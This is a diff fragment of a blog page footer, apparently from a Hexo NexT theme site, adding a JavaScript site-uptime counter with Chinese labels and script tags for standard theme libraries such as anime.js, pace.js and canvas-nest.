+        var grt= new Date("11/17/2022 8:00:00");//此处修改你的建站时间或者网站上线时间
+        now.setTime(now.getTime()+250);
+        days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days);
+        hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours);
+        if(String(hnum).length ==1 ){hnum = "0" + hnum;} minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum);
+        mnum = Math.floor(minutes); if(String(mnum).length ==1 ){mnum = "0" + mnum;}
+        seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
+        snum = Math.round(seconds); 
+        if(String(snum).length ==1 ){snum = "0" + snum;}
+        // var times = document.getElementById("times").innerHTML = hnum + " 小时 " + mnum + " 分 " + snum + " 秒";
+        document.getElementById("timeDate").innerHTML = "本站已安全运行 "+dnum+" 天 "+hnum + " 小时 " + mnum + " 分 " + snum + " 秒";
+    }
+setInterval("createtime()",250);
+</script>
+
+    </div>
+  </footer>
+
+  
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>
+
+  
+
+
+
+  <script src="/js/third-party/pace.js"></script>
+
+  
+
+
+
+
+
+  
+  
+  <script type="text/javascript"
+	count="150"
+	opacity: 1
+	src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js">
+  </script>
+  
+
+</body>
+</html>
